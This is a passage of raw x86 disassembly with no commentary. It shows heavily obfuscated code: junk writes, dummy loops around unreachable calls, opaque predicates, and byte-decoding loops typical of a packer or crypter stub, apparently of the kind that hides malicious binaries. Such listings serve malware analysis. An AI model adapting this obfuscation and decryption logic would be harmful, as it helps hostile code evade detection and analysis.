  4245fa:	mov    DWORD PTR ds:0x42685c,0x692b
  424604:	lea    ecx,[ebp-0xb0]
  42460a:	push   ecx
  42460b:	mov    edx,DWORD PTR ds:0x4268b8
  424611:	xor    ecx,ecx
  424613:	or     ecx,DWORD PTR ds:0x4268fc
  424619:	sub    ecx,edx
  42461b:	add    edx,DWORD PTR [edx+ecx*1]
  42461e:	mov    ecx,DWORD PTR [ebp+0x10]
  424621:	mov    edx,DWORD PTR ds:0x4267b8
  424627:	sbb    edx,DWORD PTR ds:0x4267d0
  42462d:	mov    DWORD PTR ds:0x4267b8,edx
  424633:	mov    edx,DWORD PTR [ebp+0x14]
  424636:	and    DWORD PTR ds:0x4267e4,0x4267d4
  424640:	xor    ecx,eax
  424642:	mov    eax,ds:0x426468
  424647:	add    ecx,0x56424137
  42464d:	xor    DWORD PTR ds:0x4267d0,0x1be6
  424657:	push   ecx
  424658:	push   0x4263be
  42465d:	add    DWORD PTR ds:0x426808,0x3707
  424667:	push   DWORD PTR [eax]
  424669:	xor    DWORD PTR ds:0x4267b0,0x4267b8
  424673:	call   0x40c883
  424678:	dec    edx
  424679:	mov    edx,DWORD PTR [ebp-0x14]
  42467c:	and    ebx,eax
  42467e:	mov    eax,DWORD PTR [ebp-0x18]
  424681:	mov    DWORD PTR ds:0x4267fc,0x1a
  42468b:	cmp    DWORD PTR ds:0x4267fc,0x0
  424692:	je     0x4246d6
  424698:	cmp    DWORD PTR ds:0x4267fc,0x1b
  42469f:	jle    0x4246d6
  4246a5:	jmp    0x4246c4
  4246aa:	push   0x4267f0
  4246af:	push   0x16bb
  4246b4:	push   0x4267d4
  4246b9:	push   0x4467
  4246be:	call   DWORD PTR ds:0x425790
  4246c4:	mov    ebx,DWORD PTR ds:0x4267fc
  4246ca:	dec    ebx
  4246cb:	mov    DWORD PTR ds:0x4267fc,ebx
  4246d1:	jmp    0x42468b
  4246d6:	mov    DWORD PTR [ebp-0x54],eax
  4246d9:	lea    eax,[edx-0x376272fb]
  4246df:	not    ebx
  4246e1:	xor    eax,esi
  4246e3:	mov    DWORD PTR ds:0x426820,edi
  4246e9:	mov    ebx,0xbd8d95b0
  4246ee:	mov    DWORD PTR ds:0x4267ec,0x38c2
  4246f8:	mov    DWORD PTR [ebp-0x24],edx
  4246fb:	mov    DWORD PTR ds:0x4267e8,0xd1f
  424705:	cmp    eax,ebx
  424707:	jne    0x42471e
  42470d:	xor    eax,eax
  42470f:	mov    DWORD PTR ds:0x4267c4,0x28c2
  424719:	jmp    0x42530a
  42471e:	mov    DWORD PTR ds:0x4267b4,0x1e
  424728:	cmp    DWORD PTR ds:0x4267b4,0x0
  42472f:	je     0x424786
  424735:	cmp    DWORD PTR ds:0x4267b4,0x2
  42473c:	jle    0x424786
  424742:	jmp    0x42475b
  424747:	push   0x4267d8
  42474c:	push   DWORD PTR [ebp-0x10]
  42474f:	push   DWORD PTR [ebp-0x28]
  424752:	push   DWORD PTR [ebp-0x20]
  424755:	call   DWORD PTR ds:0x425794
  42475b:	cmp    DWORD PTR ds:0x4267b4,0x3
  424762:	jne    0x424776
  424768:	xor    eax,eax
  42476a:	xor    eax,DWORD PTR ds:0x4267b4
  424770:	dec    eax
  424771:	mov    ds:0x4267b4,eax
  424776:	mov    eax,ds:0x4267b4
  42477b:	dec    eax
  42477c:	mov    ds:0x4267b4,eax
  424781:	jmp    0x424728
  424786:	mov    eax,DWORD PTR [ebp-0x54]
  424789:	or     ecx,DWORD PTR ds:0x4267b4
  42478f:	mov    DWORD PTR [ebp-0x44],0xbd8d9527
  424796:	mov    DWORD PTR [ebp-0x44],0xbd8d95bd
  42479d:	adc    DWORD PTR ds:0x4267b8,0x24af
  4247a7:	mov    DWORD PTR [ebp-0x1c],ebx
  4247aa:	neg    ecx
  4247ac:	mov    DWORD PTR [ebp-0x8],0xbd8d95b3
  4247b3:	dec    ecx
  4247b4:	mov    DWORD PTR [ebp-0xc],0xbd8d95b2
  4247bb:	adc    ecx,DWORD PTR ds:0x42682c
  4247c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4247c4:	adc    DWORD PTR ds:0x4267c4,0x1824
  4247ce:	mov    DWORD PTR [ebp-0x20],eax
  4247d1:	add    DWORD PTR ds:0x4267d8,0x4267b8
  4247db:	xor    ecx,esi
  4247dd:	sub    DWORD PTR ds:0x42680c,0x42684c
  4247e7:	sub    eax,ecx
  4247e9:	sub    eax,edi
  4247eb:	mov    DWORD PTR [ebp-0x4],eax
  4247ee:	mov    DWORD PTR ds:0x426814,0x492a
  4247f8:	mov    DWORD PTR [ebp-0x18],0xbd8d95bf
  4247ff:	mov    DWORD PTR ds:0x4267f0,edx
  424805:	mov    eax,DWORD PTR [ebp-0xc]
  424808:	cmp    eax,ebx
  42480a:	mov    DWORD PTR ds:0x426844,0x218d
  424814:	je     0x424cd1
  42481a:	and    DWORD PTR ds:0x4267f4,0x0
  424824:	mov    ecx,DWORD PTR ds:0x4267f4
  42482a:	inc    ecx
  42482b:	mov    DWORD PTR ds:0x4267f4,ecx
  424831:	cmp    DWORD PTR ds:0x4267f4,0x4
  424838:	ja     0x424878
  42483e:	jmp    0x424851
  424843:	push   DWORD PTR [ebp-0x18]
  424846:	push   0x37fb
  42484b:	call   DWORD PTR ds:0x425798
  424851:	cmp    DWORD PTR ds:0x4267f4,0x3
  424858:	jne    0x42486b
  42485e:	mov    ecx,DWORD PTR ds:0x4267f4
  424864:	inc    ecx
  424865:	mov    DWORD PTR ds:0x4267f4,ecx
  42486b:	cmp    DWORD PTR ds:0x4267f4,0x12
  424872:	jb     0x424824
  424878:	mov    eax,DWORD PTR [ebp-0x8]
  42487b:	movzx  ecx,BYTE PTR ds:0x42683c
  424882:	xor    DWORD PTR ds:0x4267c4,ecx
  424888:	mov    ecx,DWORD PTR [ebp-0x8]
  42488b:	sub    DWORD PTR ds:0x4267cc,0x4267f8
  424895:	xor    eax,esi
  424897:	xor    ecx,esi
  424899:	adc    DWORD PTR ds:0x4267b0,0x4267b4
  4248a3:	lea    ecx,[eax+ecx*1+0x6ec4e5f6]
  4248aa:	mov    eax,DWORD PTR [ebp-0x4]
  4248ad:	xor    DWORD PTR ds:0x426820,0x426858
  4248b7:	xor    edx,edx
  4248b9:	adc    DWORD PTR ds:0x4267c0,0x42684c
  4248c3:	div    ecx
  4248c5:	mov    eax,ds:0x4268b4
  4248ca:	mov    ecx,DWORD PTR ds:0x4268d0
  4248d0:	sub    ecx,eax
  4248d2:	add    eax,DWORD PTR [eax+ecx*1]
  4248d5:	mov    eax,DWORD PTR [ebp-0xc]
  4248d8:	xor    ecx,0x4311
  4248de:	mov    ecx,DWORD PTR [ebp-0x8]
  4248e1:	adc    DWORD PTR ds:0x42684c,0x4267f8
  4248eb:	xor    eax,esi
  4248ed:	xor    ecx,esi
  4248ef:	and    DWORD PTR ds:0x426820,0x6b14
  4248f9:	sub    eax,ecx
  4248fb:	mov    DWORD PTR ds:0x426830,0x9cc
  424905:	cmp    edx,eax
  424907:	mov    DWORD PTR ds:0x42683c,0x3ab6
  424911:	jne    0x424b5e
  424917:	mov    eax,DWORD PTR [ebp-0x4]
  42491a:	or     DWORD PTR ds:0x426834,ebx
  424920:	mov    ecx,DWORD PTR [ebp-0x24]
  424923:	or     DWORD PTR ds:0x426850,edi
  424929:	mov    cl,BYTE PTR [eax+ecx*1]
  42492c:	and    DWORD PTR ds:0x4267d4,0x0
  424936:	mov    eax,ds:0x4267d4
  42493b:	inc    eax
  42493c:	mov    ds:0x4267d4,eax
  424941:	cmp    DWORD PTR ds:0x4267d4,0x4
  424948:	jg     0x424983
  42494e:	jmp    0x42495e
  424953:	push   0x308d
  424958:	call   DWORD PTR ds:0x42579c
  42495e:	cmp    DWORD PTR ds:0x4267d4,0x3
  424965:	jne    0x424976
  42496b:	mov    eax,ds:0x4267d4
  424970:	inc    eax
  424971:	mov    ds:0x4267d4,eax
  424976:	cmp    DWORD PTR ds:0x4267d4,0x19
  42497d:	jb     0x424936
  424983:	mov    eax,DWORD PTR [ebp-0x1c]
  424986:	and    edx,DWORD PTR ds:0x42684c
  42498c:	mov    edx,DWORD PTR [ebp-0x18]
  42498f:	and    DWORD PTR ds:0x4267b0,0x426808
  424999:	xor    eax,esi
  42499b:	and    DWORD PTR ds:0x4267e8,0x4267e0
  4249a5:	xor    edx,esi
  4249a7:	mov    DWORD PTR ds:0x426814,0x69e0
  4249b1:	add    eax,edi
  4249b3:	sbb    DWORD PTR ds:0x426828,0x3c2d
  4249bd:	add    edx,edi
  4249bf:	mov    DWORD PTR ds:0x4267c0,0x2b98
  4249c9:	mov    BYTE PTR [ebp-0xe],cl
  4249cc:	mov    DWORD PTR ds:0x426854,0x1a99
  4249d6:	cmp    eax,edx
  4249d8:	jae    0x424a92
  4249de:	lea    ecx,[eax-0x376272fb]
  4249e4:	neg    edx
  4249e6:	mov    DWORD PTR [ebp-0x14],ecx
  4249e9:	inc    DWORD PTR ds:0x426824
  4249ef:	mov    edx,DWORD PTR [ebp-0x14]
  4249f2:	xor    edx,esi
  4249f4:	add    edx,0x35c4c8f2
  4249fa:	mov    DWORD PTR ds:0x4267f8,0x7a20
  424a04:	lea    ecx,[ebp+eax*4-0xc4]
  424a0b:	mov    DWORD PTR [ecx],edx
  424a0d:	mov    edx,DWORD PTR ds:0x426854
  424a13:	mov    edx,DWORD PTR [ecx]
  424a15:	cmp    edx,0x9effdb9d
  424a1b:	mov    DWORD PTR ds:0x426844,0x7c62
  424a25:	jbe    0x424a40
  424a2b:	adc    DWORD PTR ds:0x4267b0,0x4267c0
  424a35:	add    DWORD PTR [ecx],0xb934ecdc
  424a3b:	jmp    0x424a4c
  424a40:	dec    DWORD PTR ds:0x426818
  424a46:	add    DWORD PTR [ecx],0x473e5324
  424a4c:	mov    ecx,DWORD PTR [ebp-0x18]
  424a4f:	adc    DWORD PTR ds:0x4267fc,0x426808
  424a59:	xor    ecx,esi
  424a5b:	inc    eax
  424a5c:	inc    DWORD PTR [ebp-0x14]
  424a5f:	sub    DWORD PTR ds:0x426830,0x42685c
  424a69:	add    ecx,edi
  424a6b:	cmp    eax,ecx
  424a6d:	mov    DWORD PTR ds:0x4267c8,0x1692
  424a77:	jb     0x4249e9
  424a7d:	mov    edx,DWORD PTR ds:0x426828
  424a83:	add    edx,DWORD PTR ds:0x426840
  424a89:	mov    DWORD PTR ds:0x426828,edx
  424a8f:	mov    cl,BYTE PTR [ebp-0xe]
  424a92:	add    DWORD PTR ds:0x4267e0,edi
  424a98:	xor    cl,0x83
  424a9b:	mov    DWORD PTR ds:0x42681c,0x13
  424aa5:	cmp    DWORD PTR ds:0x42681c,0x0
  424aac:	je     0x424ae6
  424ab2:	cmp    DWORD PTR ds:0x42681c,0x22
  424ab9:	jge    0x424ae6
  424abf:	jmp    0x424ad4
  424ac4:	push   0x4267c0
  424ac9:	push   0x426242
  424ace:	call   DWORD PTR ds:0x4257c4
  424ad4:	mov    edx,DWORD PTR ds:0x42681c
  424ada:	dec    edx
  424adb:	mov    DWORD PTR ds:0x42681c,edx
  424ae1:	jmp    0x424aa5
  424ae6:	add    cl,0x8
  424ae9:	mov    DWORD PTR ds:0x42682c,0x13
  424af3:	cmp    DWORD PTR ds:0x42682c,0x0
  424afa:	je     0x424b49
  424b00:	cmp    DWORD PTR ds:0x42682c,0x6
  424b07:	jb     0x424b49
  424b0d:	jmp    0x424b1d
  424b12:	push   0x4267d4
  424b17:	call   DWORD PTR ds:0x4257c8
  424b1d:	cmp    DWORD PTR ds:0x42682c,0x7
  424b24:	jne    0x424b37
  424b2a:	mov    edx,DWORD PTR ds:0x42682c
  424b30:	dec    edx
  424b31:	mov    DWORD PTR ds:0x42682c,edx
  424b37:	mov    edx,DWORD PTR ds:0x42682c
  424b3d:	dec    edx
  424b3e:	mov    DWORD PTR ds:0x42682c,edx
  424b44:	jmp    0x424af3
  424b49:	xor    eax,eax
  424b4b:	mov    eax,DWORD PTR [ebp-0x4]
  424b4e:	mov    edx,DWORD PTR [ebp-0x24]
  424b51:	mov    DWORD PTR ds:0x42680c,0x2e5f
  424b5b:	mov    BYTE PTR [eax+edx*1],cl
  424b5e:	sbb    ecx,eax
  424b60:	mov    eax,DWORD PTR [ebp-0x4]
  424b63:	and    DWORD PTR ds:0x4267d4,0x0
  424b6d:	mov    ecx,DWORD PTR ds:0x4267d4
  424b73:	inc    ecx
  424b74:	mov    DWORD PTR ds:0x4267d4,ecx
  424b7a:	cmp    DWORD PTR ds:0x4267d4,0xb
  424b81:	jbe    0x424bc4
  424b87:	jmp    0x424b9d
  424b8c:	push   DWORD PTR [ebp-0x1c]
  424b8f:	push   0x699f
  424b94:	push   DWORD PTR [ebp-0x18]
  424b97:	call   DWORD PTR ds:0x4257a0
  424b9d:	cmp    DWORD PTR ds:0x4267d4,0xa
  424ba4:	jne    0x424bb7
  424baa:	mov    ecx,DWORD PTR ds:0x4267d4
  424bb0:	inc    ecx
  424bb1:	mov    DWORD PTR ds:0x4267d4,ecx
  424bb7:	cmp    DWORD PTR ds:0x4267d4,0x10
  424bbe:	jb     0x424b6d
  424bc4:	mov    ecx,DWORD PTR [ebp-0x1c]
  424bc7:	add    DWORD PTR ds:0x42681c,0x2f15
  424bd1:	sub    eax,edi
  424bd3:	sbb    DWORD PTR ds:0x4267b0,0x426830
  424bdd:	xor    eax,esi
  424bdf:	mov    DWORD PTR ds:0x4267b8,0x5ea0
  424be9:	cmp    eax,ecx
  424beb:	mov    DWORD PTR ds:0x4267e4,0x6c4
  424bf5:	jne    0x424c7b
  424bfb:	sbb    DWORD PTR ds:0x4267f8,edi
  424c01:	mov    eax,DWORD PTR [ebp-0xc]
  424c04:	add    DWORD PTR ds:0x4267d8,edx
  424c0a:	mov    ecx,DWORD PTR [ebp-0x8]
  424c0d:	xor    DWORD PTR ds:0x4267c8,0x4267e8
  424c17:	xor    eax,esi
  424c19:	xor    ecx,esi
  424c1b:	sub    DWORD PTR ds:0x426824,0x426804
  424c25:	sub    eax,ecx
  424c27:	mov    ecx,DWORD PTR [ebp-0x20]
  424c2a:	mov    DWORD PTR ds:0x4267b0,0x351
  424c34:	sub    eax,edi
  424c36:	sub    DWORD PTR ds:0x426830,0xf22
  424c40:	xor    eax,esi
  424c42:	xor    DWORD PTR ds:0x426830,0x7b4b
  424c4c:	mov    DWORD PTR [ebp-0xc],eax
  424c4f:	mov    eax,DWORD PTR [ebp-0x8]
  424c52:	xor    eax,esi
  424c54:	xor    DWORD PTR ds:0x4267d8,0x426808
  424c5e:	sub    ecx,eax
  424c60:	or     DWORD PTR ds:0x4267f8,0x535
  424c6a:	sub    ecx,edi
  424c6c:	mov    DWORD PTR ds:0x426808,0x5c8c
  424c76:	jmp    0x424ca0
  424c7b:	mov    ecx,DWORD PTR ds:0x4267e8
  424c81:	or     DWORD PTR ds:0x4267c0,ecx
  424c87:	mov    eax,DWORD PTR [ebp-0x8]
  424c8a:	xor    eax,esi
  424c8c:	mov    ecx,0xc89d8d05
  424c91:	or     DWORD PTR ds:0x42683c,0x4311
  424c9b:	sub    ecx,eax
  424c9d:	add    ecx,DWORD PTR [ebp-0x4]
  424ca0:	mov    DWORD PTR [ebp-0x4],ecx
  424ca3:	mov    eax,DWORD PTR [ebp-0xc]
  424ca6:	mov    DWORD PTR ds:0x426844,0x423
  424cb0:	cmp    eax,ebx
  424cb2:	mov    DWORD PTR ds:0x4267b8,0x1644
  424cbc:	jne    0x42481a
  424cc2:	mov    ecx,DWORD PTR ds:0x4267d0
  424cc8:	or     DWORD PTR ds:0x426840,ecx
  424cce:	mov    edx,DWORD PTR [ebp-0x24]
  424cd1:	mov    eax,DWORD PTR [ebp-0x54]
  424cd4:	sub    DWORD PTR ds:0x4267c8,0x6970
  424cde:	mov    DWORD PTR [ebp-0x20],0xbd8d9527
  424ce5:	and    DWORD PTR ds:0x42685c,0x0
  424cef:	jmp    0x424d01
  424cf4:	mov    ecx,DWORD PTR ds:0x42685c
  424cfa:	inc    ecx
  424cfb:	mov    DWORD PTR ds:0x42685c,ecx
  424d01:	cmp    DWORD PTR ds:0x42685c,0x11
  424d08:	jae    0x424d54
  424d0e:	cmp    DWORD PTR ds:0x42685c,0x8
  424d15:	ja     0x424d54
  424d1b:	jmp    0x424d33
  424d20:	push   DWORD PTR [ebp-0x18]
  424d23:	push   0x4267c0
  424d28:	push   0x42604a
  424d2d:	call   DWORD PTR ds:0x4257cc
  424d33:	cmp    DWORD PTR ds:0x42685c,0x7
  424d3a:	jne    0x424d4f
  424d40:	xor    ecx,ecx
  424d42:	xor    ecx,DWORD PTR ds:0x42685c
  424d48:	inc    ecx
  424d49:	mov    DWORD PTR ds:0x42685c,ecx
  424d4f:	jmp    0x424cf4
  424d54:	mov    DWORD PTR [ebp-0x28],0xbd8d95bd
  424d5b:	add    DWORD PTR ds:0x426818,edx
  424d61:	mov    DWORD PTR [ebp-0x1c],ebx
  424d64:	mov    DWORD PTR [ebp-0x8],0xbd8d95b3
  424d6b:	mov    DWORD PTR [ebp-0xc],0xbd8d95b2
  424d72:	mov    ecx,DWORD PTR [ebp-0x8]
  424d75:	mov    DWORD PTR [ebp-0x34],eax
  424d78:	xor    ecx,esi
  424d7a:	sub    eax,ecx
  424d7c:	sub    eax,edi
  424d7e:	mov    DWORD PTR [ebp-0x4],eax
  424d81:	mov    DWORD PTR [ebp-0x18],0xbd8d95bf
  424d88:	mov    eax,DWORD PTR [ebp-0xc]
  424d8b:	cmp    eax,ebx
  424d8d:	je     0x424eaa
  424d93:	mov    eax,DWORD PTR [ebp-0x8]
  424d96:	mov    ecx,DWORD PTR [ebp-0x8]
  424d99:	xor    eax,esi
  424d9b:	xor    ecx,esi
  424d9d:	lea    ecx,[eax+ecx*1+0x6ec4e5f6]
  424da4:	mov    eax,DWORD PTR [ebp-0x4]
  424da7:	xor    edx,edx
  424da9:	div    ecx
  424dab:	mov    eax,DWORD PTR [ebp-0xc]
  424dae:	mov    ecx,DWORD PTR [ebp-0x8]
  424db1:	xor    eax,esi
  424db3:	xor    ecx,esi
  424db5:	sub    eax,ecx
  424db7:	cmp    edx,eax
  424db9:	jne    0x424e54
  424dbf:	mov    eax,DWORD PTR [ebp-0x4]
  424dc2:	mov    ecx,DWORD PTR [ebp-0x24]
  424dc5:	mov    dl,BYTE PTR [eax+ecx*1]
  424dc8:	mov    eax,DWORD PTR [ebp-0x1c]
  424dcb:	mov    ecx,DWORD PTR [ebp-0x18]
  424dce:	xor    eax,esi
  424dd0:	xor    ecx,esi
  424dd2:	add    eax,edi
  424dd4:	add    ecx,edi
  424dd6:	mov    BYTE PTR [ebp-0xe],dl
  424dd9:	cmp    eax,ecx
  424ddb:	jae    0x424e33
  424de1:	lea    ecx,[eax-0x376272fb]
  424de7:	mov    DWORD PTR [ebp-0x14],ecx
  424dea:	mov    edx,DWORD PTR [ebp-0x14]
  424ded:	xor    edx,esi
  424def:	add    edx,0x35c4c8f2
  424df5:	lea    ecx,[ebp+eax*4-0xec]
  424dfc:	mov    DWORD PTR [ecx],edx
  424dfe:	mov    edx,DWORD PTR [ecx]
  424e00:	cmp    edx,0x9effdb9d
  424e06:	jbe    0x424e17
  424e0c:	add    DWORD PTR [ecx],0xb934ecdc
  424e12:	jmp    0x424e1d
  424e17:	add    DWORD PTR [ecx],0x473e5324
  424e1d:	mov    ecx,DWORD PTR [ebp-0x18]
  424e20:	xor    ecx,esi
  424e22:	inc    eax
  424e23:	inc    DWORD PTR [ebp-0x14]
  424e26:	add    ecx,edi
  424e28:	cmp    eax,ecx
  424e2a:	jb     0x424dea
  424e30:	mov    dl,BYTE PTR [ebp-0xe]
  424e33:	mov    eax,DWORD PTR [ebp-0x20]
  424e36:	xor    al,0xb5
  424e38:	mov    cl,0x5
  424e3a:	sub    cl,al
  424e3c:	add    dl,cl
  424e3e:	mov    ecx,DWORD PTR [ebp-0x28]
  424e41:	xor    cl,0xb5
  424e44:	sub    cl,0x5
  424e47:	ror    dl,cl
  424e49:	xor    eax,eax
  424e4b:	mov    eax,DWORD PTR [ebp-0x4]
  424e4e:	mov    ecx,DWORD PTR [ebp-0x24]
  424e51:	mov    BYTE PTR [eax+ecx*1],dl
  424e54:	mov    eax,DWORD PTR [ebp-0x4]
  424e57:	mov    ecx,DWORD PTR [ebp-0x1c]
  424e5a:	sub    eax,edi
  424e5c:	xor    eax,esi
  424e5e:	cmp    eax,ecx
  424e60:	jne    0x424e8a
  424e66:	mov    eax,DWORD PTR [ebp-0xc]
  424e69:	mov    ecx,DWORD PTR [ebp-0x8]
  424e6c:	xor    eax,esi
  424e6e:	xor    ecx,esi
  424e70:	sub    eax,ecx
  424e72:	mov    ecx,DWORD PTR [ebp-0x34]
  424e75:	sub    eax,edi
  424e77:	xor    eax,esi
  424e79:	mov    DWORD PTR [ebp-0xc],eax
  424e7c:	mov    eax,DWORD PTR [ebp-0x8]
  424e7f:	xor    eax,esi
  424e81:	sub    ecx,eax
  424e83:	sub    ecx,edi
  424e85:	jmp    0x424e99
  424e8a:	mov    eax,DWORD PTR [ebp-0x8]
  424e8d:	xor    eax,esi
  424e8f:	mov    ecx,0xc89d8d05
  424e94:	sub    ecx,eax
  424e96:	add    ecx,DWORD PTR [ebp-0x4]
  424e99:	mov    DWORD PTR [ebp-0x4],ecx
  424e9c:	mov    eax,DWORD PTR [ebp-0xc]
  424e9f:	cmp    eax,ebx
  424ea1:	jne    0x424d93
  424ea7:	mov    edx,DWORD PTR [ebp-0x24]
  424eaa:	mov    DWORD PTR [ebp-0x18],0xe
  424eb1:	mov    eax,DWORD PTR [ebp-0x18]
  424eb4:	dec    eax
  424eb5:	and    eax,0x1
  424eb8:	mov    DWORD PTR [ebp-0x20],eax
  424ebb:	mov    eax,DWORD PTR [ebp-0x54]
  424ebe:	mov    DWORD PTR [ebp-0x28],0xbd8d9527
  424ec5:	mov    DWORD PTR [ebp-0x34],0xbd8d95bd
  424ecc:	mov    DWORD PTR [ebp-0x30],ebx
  424ecf:	mov    DWORD PTR [ebp-0x8],0xbd8d95b3
  424ed6:	mov    DWORD PTR [ebp-0xc],0xbd8d95b2
  424edd:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee0:	mov    DWORD PTR [ebp-0x4c],eax
  424ee3:	xor    ecx,esi
  424ee5:	sub    eax,ecx
  424ee7:	sub    eax,edi
  424ee9:	mov    DWORD PTR [ebp-0x4],eax
  424eec:	mov    DWORD PTR [ebp-0x1c],0xbd8d95bf
  424ef3:	mov    eax,DWORD PTR [ebp-0xc]
  424ef6:	cmp    eax,ebx
  424ef8:	je     0x42502a
  424efe:	mov    eax,DWORD PTR [ebp-0x8]
  424f01:	mov    ecx,DWORD PTR [ebp-0x8]
  424f04:	xor    eax,esi
  424f06:	xor    ecx,esi
  424f08:	lea    ecx,[eax+ecx*1+0x6ec4e5f6]
  424f0f:	mov    eax,DWORD PTR [ebp-0x4]
  424f12:	xor    edx,edx
  424f14:	div    ecx
  424f16:	mov    eax,DWORD PTR [ebp-0xc]
  424f19:	mov    ecx,DWORD PTR [ebp-0x8]
  424f1c:	xor    eax,esi
  424f1e:	xor    ecx,esi
  424f20:	sub    eax,ecx
  424f22:	cmp    edx,eax
  424f24:	jne    0x424fd4
  424f2a:	mov    eax,DWORD PTR [ebp-0x4]
  424f2d:	mov    ecx,DWORD PTR [ebp-0x24]
  424f30:	mov    dl,BYTE PTR [eax+ecx*1]
  424f33:	mov    eax,DWORD PTR [ebp-0x30]
  424f36:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f39:	xor    eax,esi
  424f3b:	xor    ecx,esi
  424f3d:	add    eax,edi
  424f3f:	add    ecx,edi
  424f41:	mov    BYTE PTR [ebp-0xe],dl
  424f44:	cmp    eax,ecx
  424f46:	jae    0x424f9e
  424f4c:	lea    ecx,[eax-0x376272fb]
  424f52:	mov    DWORD PTR [ebp-0x14],ecx
  424f55:	mov    edx,DWORD PTR [ebp-0x14]
  424f58:	xor    edx,esi
  424f5a:	add    edx,0x35c4c8f2
  424f60:	lea    ecx,[ebp+eax*4-0xd8]
  424f67:	mov    DWORD PTR [ecx],edx
  424f69:	mov    edx,DWORD PTR [ecx]
  424f6b:	cmp    edx,0x9effdb9d
  424f71:	jbe    0x424f82
  424f77:	add    DWORD PTR [ecx],0xb934ecdc
  424f7d:	jmp    0x424f88
  424f82:	add    DWORD PTR [ecx],0x473e5324
  424f88:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f8b:	xor    ecx,esi
  424f8d:	inc    eax
  424f8e:	inc    DWORD PTR [ebp-0x14]
  424f91:	add    ecx,edi
  424f93:	cmp    eax,ecx
  424f95:	jb     0x424f55
  424f9b:	mov    dl,BYTE PTR [ebp-0xe]
  424f9e:	cmp    DWORD PTR [ebp-0x20],0x0
  424fa2:	jne    0x424fb3
  424fa8:	xor    dl,0x83
  424fab:	add    dl,0x8
  424fae:	jmp    0x424fc9
  424fb3:	mov    eax,DWORD PTR [ebp-0x28]
  424fb6:	xor    al,0xb5
  424fb8:	mov    cl,0x5
  424fba:	sub    cl,al
  424fbc:	add    dl,cl
  424fbe:	mov    ecx,DWORD PTR [ebp-0x34]
  424fc1:	xor    cl,0xb5
  424fc4:	sub    cl,0x5
  424fc7:	ror    dl,cl
  424fc9:	xor    eax,eax
  424fcb:	mov    eax,DWORD PTR [ebp-0x4]
  424fce:	mov    ecx,DWORD PTR [ebp-0x24]
  424fd1:	mov    BYTE PTR [eax+ecx*1],dl
  424fd4:	mov    eax,DWORD PTR [ebp-0x4]
  424fd7:	mov    ecx,DWORD PTR [ebp-0x30]
  424fda:	sub    eax,edi
  424fdc:	xor    eax,esi
  424fde:	cmp    eax,ecx
  424fe0:	jne    0x42500a
  424fe6:	mov    eax,DWORD PTR [ebp-0xc]
  424fe9:	mov    ecx,DWORD PTR [ebp-0x8]
  424fec:	xor    eax,esi
  424fee:	xor    ecx,esi
  424ff0:	sub    eax,ecx
  424ff2:	mov    ecx,DWORD PTR [ebp-0x4c]
  424ff5:	sub    eax,edi
  424ff7:	xor    eax,esi
  424ff9:	mov    DWORD PTR [ebp-0xc],eax
  424ffc:	mov    eax,DWORD PTR [ebp-0x8]
  424fff:	xor    eax,esi
  425001:	sub    ecx,eax
  425003:	sub    ecx,edi
  425005:	jmp    0x425019
  42500a:	mov    eax,DWORD PTR [ebp-0x8]
  42500d:	xor    eax,esi
  42500f:	mov    ecx,0xc89d8d05
  425014:	sub    ecx,eax
  425016:	add    ecx,DWORD PTR [ebp-0x4]
  425019:	mov    DWORD PTR [ebp-0x4],ecx
  42501c:	mov    eax,DWORD PTR [ebp-0xc]
  42501f:	cmp    eax,ebx
  425021:	jne    0x424efe
  425027:	mov    edx,DWORD PTR [ebp-0x24]
  42502a:	mov    eax,DWORD PTR [ebp+0x8]
  42502d:	mov    ecx,DWORD PTR [ebp+0xc]
  425030:	xor    eax,0x6729a14b
  425035:	add    eax,0x56424137
  42503a:	jmp    0x42529c
  42503f:	lea    ecx,[eax+edx*1]
  425042:	mov    DWORD PTR [ebp-0x28],ecx
  425045:	mov    ecx,DWORD PTR [ebp-0x54]
  425048:	sub    ecx,eax
  42504a:	mov    DWORD PTR [ebp-0x20],ecx
  42504d:	mov    ecx,DWORD PTR [ebp-0x20]
  425050:	mov    DWORD PTR [ebp-0x14],ecx
  425053:	mov    ecx,DWORD PTR [ebp-0x28]
  425056:	mov    DWORD PTR [ebp-0x50],ebx
  425059:	mov    DWORD PTR [ebp-0x60],ecx
  42505c:	mov    DWORD PTR [ebp-0x2c],0xbd8d95b3
  425063:	mov    ecx,DWORD PTR [ebp-0x50]
  425066:	xor    ecx,esi
  425068:	add    ecx,edi
  42506a:	mov    DWORD PTR [ebp-0x8],ecx
  42506d:	mov    ecx,DWORD PTR [ebp-0x50]
  425070:	xor    ecx,esi
  425072:	add    ecx,edi
  425074:	mov    DWORD PTR [ebp-0xc],ecx
  425077:	mov    DWORD PTR [ebp-0x28],0xbd8d9590
  42507e:	mov    DWORD PTR [ebp-0x34],0xbd8d95b9
  425085:	mov    ecx,DWORD PTR [ebp-0x50]
  425088:	mov    edx,DWORD PTR [ebp-0x14]
  42508b:	xor    ecx,esi
  42508d:	add    ecx,edi
  42508f:	cmp    edx,ecx
  425091:	je     0x425286
  425097:	mov    eax,DWORD PTR [ebp-0x2c]
  42509a:	xor    eax,esi
  42509c:	mov    ecx,0xc89d8d05
  4250a1:	sub    ecx,eax
  4250a3:	add    ecx,DWORD PTR [ebp-0x14]
  4250a6:	mov    eax,DWORD PTR [ebp-0x2c]
  4250a9:	mov    edx,DWORD PTR [ebp-0x8]
  4250ac:	xor    eax,esi
  4250ae:	add    eax,edi
  4250b0:	imul   eax,edx
  4250b3:	cmp    eax,ecx
  4250b5:	ja     0x425283
  4250bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4250be:	mov    eax,DWORD PTR [ebp-0x14]
  4250c1:	sub    eax,ecx
  4250c3:	mov    ecx,DWORD PTR [ebp-0x28]
  4250c6:	xor    ecx,esi
  4250c8:	add    ecx,edi
  4250ca:	xor    edx,edx
  4250cc:	div    ecx
  4250ce:	mov    DWORD PTR [ebp-0xc],eax
  4250d1:	mov    eax,DWORD PTR [ebp-0x34]
  4250d4:	mov    ecx,DWORD PTR [ebp-0xc]
  4250d7:	xor    eax,esi
  4250d9:	add    eax,edi
  4250db:	cmp    ecx,eax
  4250dd:	jbe    0x4250ed
  4250e3:	mov    eax,DWORD PTR [ebp-0x34]
  4250e6:	xor    eax,esi
  4250e8:	add    eax,edi
  4250ea:	mov    DWORD PTR [ebp-0xc],eax
  4250ed:	mov    eax,DWORD PTR [ebp-0x28]
  4250f0:	mov    ecx,DWORD PTR [ebp-0xc]
